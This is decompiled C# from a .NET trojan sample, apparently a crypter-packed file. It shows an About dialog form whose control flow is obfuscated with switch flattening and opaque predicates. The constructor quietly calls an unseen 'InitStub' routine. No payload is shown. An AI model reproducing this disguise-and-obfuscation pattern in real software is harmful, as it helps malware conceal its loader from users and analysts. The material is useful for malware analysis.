// Decompiled with JetBrains decompiler
// Type: RiskGame.Queues.TokenFieldQueue
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Structs;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace RiskGame.Queues
{
  internal class TokenFieldQueue : Form
  {
    private IContainer m_Config;
    private TableLayoutPanel _Bridge;
    private PictureBox m_Getter;
    private Label m_Struct;
    private Label _Task;
    private Label callback;
    private Label identifier;
    private TextBox m_Visitor;
    private Button service;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public TokenFieldQueue()
    {
      int num1 = 1;
      if (true)
        goto label_6;
label_1:
      this.m_Config = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      int num2 = 2;
label_5:
      num1 = num2;
label_6:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_2;
          case 2:
            this.ExcludeRequest();
            this.Text = string.Format("About {0}", (object) this.UpdateRequest());
            goto case 3;
          case 3:
            this.m_Struct.Text = this.CallRequest();
            this._Task.Text = string.Format("Version {0}", (object) this.PopRequest());
            this.callback.Text = this.ReflectRequest();
            if (!TokenFieldQueue.EnableObject())
            {
              num1 = 6;
              continue;
            }
            goto case 2;
          case 4:
          case 6:
            this.identifier.Text = this.SelectRequest();
            this.m_Visitor.Text = this.SortRequest();
            if (true)
            {
              num1 = 7;
              continue;
            }
            goto label_9;
          case 5:
            goto label_1;
          case 7:
            goto label_10;
          default:
            num1 = 3;
            continue;
        }
      }
label_2:
      ListenerManager.InitStub();
      num2 = 5;
      goto label_5;
label_10:
      return;
label_9:;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string UpdateRequest()
    {
      int num1 = 2;
      if (true)
        goto label_9;
label_1:
      object[] customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyTitleAttribute), false);
      if (true)
      {
        num1 = 4;
        goto label_9;
      }
label_2:
      AssemblyTitleAttribute assemblyTitleAttribute;
      int num2;
      if (customAttributes.Length != 0)
      {
        assemblyTitleAttribute = (AssemblyTitleAttribute) customAttributes[0];
        num2 = 5;
        goto label_8;
      }
label_6:
      string str = Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().CodeBase);
      num2 = 6;
label_8:
      num1 = num2;
label_9:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_4;
          case 4:
            goto label_2;
          case 5:
            goto label_7;
          case 6:
            goto label_12;
          default:
            if (!TokenFieldQueue.EnableObject())
            {
              num1 = 1;
              continue;
            }
            goto label_12;
        }
      }
label_4:
      bool flag;
      if (flag)
      {
        str = assemblyTitleAttribute.Title;
        goto label_12;
      }
      else
        goto label_6;
label_7:
      flag = assemblyTitleAttribute.Title != "";
      goto label_4;
label_12:
      return str;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string PopRequest() => Assembly.GetExecutingAssembly().GetName().Version.ToString();

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string SortRequest()
    {
      int num1 = 2;
      string str;
      while (true)
      {
        int num2 = num1;
        object[] customAttributes;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyDescriptionAttribute), false);
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_2;
            case 1:
            case 3:
              if (customAttributes.Length == 0)
              {
                if (TokenFieldQueue.SortObject())
                {
                  num2 = 5;
                  continue;
                }
                goto label_10;
              }
              else
                goto label_6;
            case 4:
            case 6:
              goto label_10;
            case 5:
              goto label_2;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 4;
        continue;
label_6:
        str = ((AssemblyDescriptionAttribute) customAttributes[0]).Description;
        num1 = 6;
      }
label_2:
      str = "";
label_10:
      return str;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string CallRequest()
    {
      int num1 = 4;
      string str;
      while (true)
      {
        bool flag;
        int num2;
        object[] customAttributes;
        switch (num1)
        {
          case 0:
          case 4:
            customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyProductAttribute), false);
            num2 = 3;
            break;
          case 1:
            goto label_7;
          case 2:
          case 5:
            if (!flag)
            {
              str = ((AssemblyProductAttribute) customAttributes[0]).Product;
              num1 = 6;
              continue;
            }
            goto label_7;
          case 3:
            flag = customAttributes.Length == 0;
            num1 = 5;
            continue;
          case 6:
            goto label_9;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
      }
label_7:
      str = "";
label_9:
      return str;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string ReflectRequest()
    {
      int num1 = 3;
      string str;
      while (true)
      {
        int num2 = num1;
        object[] customAttributes;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              if (customAttributes.Length == 0)
              {
                if (true)
                {
                  num2 = 4;
                  continue;
                }
                goto label_10;
              }
              else
                goto label_9;
            case 2:
            case 4:
              goto label_2;
            case 3:
              customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyCopyrightAttribute), false);
              num2 = 0;
              continue;
            case 5:
            case 6:
              goto label_10;
            default:
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto case 0;
          }
        }
label_9:
        str = ((AssemblyCopyrightAttribute) customAttributes[0]).Copyright;
        num1 = 6;
      }
label_2:
      str = "";
label_10:
      return str;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string SelectRequest()
    {
      int num1 = 3;
      string str;
      while (true)
      {
        int num2 = num1;
        bool flag;
        object[] customAttributes;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof (AssemblyCompanyAttribute), false);
              if (TokenFieldQueue.SortObject())
              {
                num2 = 4;
                continue;
              }
              goto case 1;
            case 1:
            case 4:
              flag = customAttributes.Length == 0;
              if (TokenFieldQueue.SortObject())
              {
                num2 = 2;
                continue;
              }
              goto label_11;
            case 2:
              if (!flag)
              {
                str = ((AssemblyCompanyAttribute) customAttributes[0]).Company;
                num2 = 6;
                continue;
              }
              goto label_2;
            case 5:
            case 6:
              goto label_11;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 5;
      }
label_2:
      str = "";
label_11:
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool additem)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
            case 1:
              num3 = this.m_Config != null ? 1 : 0;
              break;
            case 2:
            case 4:
label_10:
              this.m_Config.Dispose();
              goto label_11;
            case 3:
              if (!additem)
              {
                num3 = 0;
                break;
              }
              goto label_2;
            case 5:
              goto label_6;
            default:
              if (!TokenFieldQueue.EnableObject())
              {
                num2 = 4;
                continue;
              }
              goto case 2;
          }
          if (num3 != 0)
            goto label_10;
label_11:
          base.Dispose(additem);
          if (true)
            num2 = 5;
          else
            goto label_12;
        }
label_2:
        num1 = 0;
      }
label_6:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ExcludeRequest()
    {
      int num1 = 28;
      if (!TokenFieldQueue.EnableObject())
        goto label_31;
label_1:
      this._Bridge.Location = new Point(9, 9);
      this._Bridge.Name = "tableLayoutPanel";
      this._Bridge.RowCount = 6;
      this._Bridge.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this._Bridge.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this._Bridge.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this._Bridge.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      int num2 = 25;
label_30:
      num1 = num2;
label_31:
      ComponentResourceManager componentResourceManager;
      while (true)
      {
        switch (num1)
        {
          case 0:
            this.m_Visitor.Location = new Point(143, 107);
            this.m_Visitor.Margin = new Padding(6, 3, 3, 3);
            this.m_Visitor.Multiline = true;
            this.m_Visitor.Name = "textBoxDescription";
            this.m_Visitor.ReadOnly = true;
            this.m_Visitor.ScrollBars = ScrollBars.Both;
            this.m_Visitor.Size = new Size(271, 126);
            num1 = 2;
            continue;
          case 1:
            this._Task.MaximumSize = new Size(0, 17);
            this._Task.Name = "labelVersion";
            this._Task.Size = new Size(271, 17);
            this._Task.TabIndex = 0;
            this._Task.Text = "Version";
            this._Task.TextAlign = ContentAlignment.MiddleLeft;
            this.callback.Dock = DockStyle.Fill;
            this.callback.Location = new Point(143, 52);
            this.callback.Margin = new Padding(6, 0, 3, 0);
            goto case 15;
          case 2:
            this.m_Visitor.TabIndex = 23;
            this.m_Visitor.TabStop = false;
            this.m_Visitor.Text = "Description";
            if (true)
            {
              num1 = 13;
              continue;
            }
            goto case 11;
          case 3:
            this._Bridge.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 67f));
            this._Bridge.Controls.Add((Control) this.m_Getter, 0, 0);
            this._Bridge.Controls.Add((Control) this.m_Struct, 1, 0);
            num1 = 24;
            continue;
          case 4:
            goto label_12;
          case 5:
            goto label_13;
          case 6:
            this._Bridge.PerformLayout();
            ((ISupportInitialize) this.m_Getter).EndInit();
            this.ResumeLayout(false);
            int num3 = 30;
            num1 = TokenFieldQueue.EnableObject() ? num3 : num3;
            continue;
          case 7:
            goto label_8;
          case 8:
            goto label_2;
          case 9:
            goto label_7;
          case 10:
            this.identifier.Dock = DockStyle.Fill;
            if (true)
            {
              num1 = 9;
              continue;
            }
            goto case 27;
          case 11:
          case 18:
            this.m_Getter.Dock = DockStyle.Fill;
            this.m_Getter.Image = (Image) componentResourceManager.GetObject("logoPictureBox.Image");
            this.m_Getter.Location = new Point(3, 3);
            this.m_Getter.Name = "logoPictureBox";
            this._Bridge.SetRowSpan((Control) this.m_Getter, 6);
            this.m_Getter.Size = new Size(131, 259);
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto case 24;
          case 12:
            this.service.DialogResult = DialogResult.Cancel;
            this.service.Location = new Point(339, 239);
            this.service.Name = "okButton";
            this.service.Size = new Size(75, 23);
            this.service.TabIndex = 24;
            if (TokenFieldQueue.SortObject())
            {
              num1 = 4;
              continue;
            }
            goto case 0;
          case 13:
            goto label_14;
          case 14:
            goto label_6;
          case 15:
          case 23:
            this.callback.MaximumSize = new Size(0, 17);
            this.callback.Name = "labelCopyright";
            this.callback.Size = new Size(271, 17);
            num1 = 26;
            continue;
          case 16:
            goto label_1;
          case 17:
            goto label_3;
          case 19:
            goto label_9;
          case 20:
            goto label_10;
          case 21:
            this.m_Getter.TabStop = false;
            this.m_Struct.Dock = DockStyle.Fill;
            this.m_Struct.Location = new Point(143, 0);
            this.m_Struct.Margin = new Padding(6, 0, 3, 0);
            this.m_Struct.MaximumSize = new Size(0, 17);
            this.m_Struct.Name = "labelProductName";
            this.m_Struct.Size = new Size(271, 17);
            this.m_Struct.TabIndex = 19;
            this.m_Struct.Text = "Product Name";
            this.m_Struct.TextAlign = ContentAlignment.MiddleLeft;
            this._Task.Dock = DockStyle.Fill;
            this._Task.Location = new Point(143, 26);
            this._Task.Margin = new Padding(6, 0, 3, 0);
            if (TokenFieldQueue.SortObject())
            {
              num1 = 1;
              continue;
            }
            goto case 12;
          case 22:
            this.Padding = new Padding(9);
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = FormStartPosition.CenterParent;
            this.Text = "AboutBox1";
            this._Bridge.ResumeLayout(false);
            if (TokenFieldQueue.SortObject())
            {
              num1 = 6;
              continue;
            }
            goto case 21;
          case 24:
            this._Bridge.Controls.Add((Control) this._Task, 1, 1);
            this._Bridge.Controls.Add((Control) this.callback, 1, 2);
            this._Bridge.Controls.Add((Control) this.identifier, 1, 3);
            if (true)
            {
              num1 = 8;
              continue;
            }
            goto case 6;
          case 25:
            goto label_5;
          case 26:
            this.callback.TabIndex = 21;
            this.callback.Text = "Copyright";
            this.callback.TextAlign = ContentAlignment.MiddleLeft;
            if (true)
            {
              num1 = 10;
              continue;
            }
            goto label_5;
          case 27:
            this._Bridge.TabIndex = 0;
            if (TokenFieldQueue.SortObject())
            {
              num1 = 18;
              continue;
            }
            goto case 15;
          case 28:
            goto label_11;
          case 29:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(435, 283);
            this.Controls.Add((Control) this._Bridge);
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "AboutBox1";
            num1 = 22;
            continue;
          case 30:
            goto label_28;
          default:
            goto label_32;
        }
      }
label_2:
      this._Bridge.Controls.Add((Control) this.m_Visitor, 1, 4);
      this._Bridge.Controls.Add((Control) this.service, 1, 5);
      num2 = 17;
      goto label_30;
label_3:
      this._Bridge.Dock = DockStyle.Fill;
      num2 = 16;
      goto label_30;
label_5:
      this._Bridge.RowStyles.Add(new RowStyle(SizeType.Percent, 50f));
      this._Bridge.RowStyles.Add(new RowStyle(SizeType.Percent, 10f));
      this._Bridge.Size = new Size(417, 265);
      num2 = 27;
      goto label_30;
label_6:
      this.identifier.Size = new Size(271, 17);
      this.identifier.TabIndex = 22;
      this.identifier.Text = "Company Name";
      this.identifier.TextAlign = ContentAlignment.MiddleLeft;
      this.m_Visitor.Dock = DockStyle.Fill;
      num2 = 0;
      goto label_30;
label_7:
      this.identifier.Location = new Point(143, 78);
      this.identifier.Margin = new Padding(6, 0, 3, 0);
      this.identifier.MaximumSize = new Size(0, 17);
      this.identifier.Name = "labelCompanyName";
      num2 = 14;
      goto label_30;
label_8:
      this._Bridge = new TableLayoutPanel();
      num2 = 19;
      goto label_30;
label_9:
      this.m_Getter = new PictureBox();
      this.m_Struct = new Label();
      this._Task = new Label();
      this.callback = new Label();
      num2 = 20;
      goto label_30;
label_10:
      this.identifier = new Label();
      this.m_Visitor = new TextBox();
      this.service = new Button();
      this._Bridge.SuspendLayout();
      ((ISupportInitialize) this.m_Getter).BeginInit();
      this.SuspendLayout();
      this._Bridge.ColumnCount = 2;
      this._Bridge.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 33f));
      num2 = 3;
      goto label_30;
label_11:
      componentResourceManager = new ComponentResourceManager(typeof (TokenFieldQueue));
      num2 = 7;
      goto label_30;
label_12:
      this.service.Text = "&OK";
      this.AcceptButton = (IButtonControl) this.service;
      num2 = 29;
      goto label_30;
label_13:
      this.m_Getter.SizeMode = PictureBoxSizeMode.StretchImage;
      this.m_Getter.TabIndex = 12;
      num2 = 21;
      goto label_30;
label_14:
      this.service.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      num2 = 12;
      goto label_30;
label_28:
      return;
label_32:
      num2 = 23;
      goto label_30;
    }

    internal static bool SortObject() => true;

    internal static bool EnableObject() => false;
  }
}
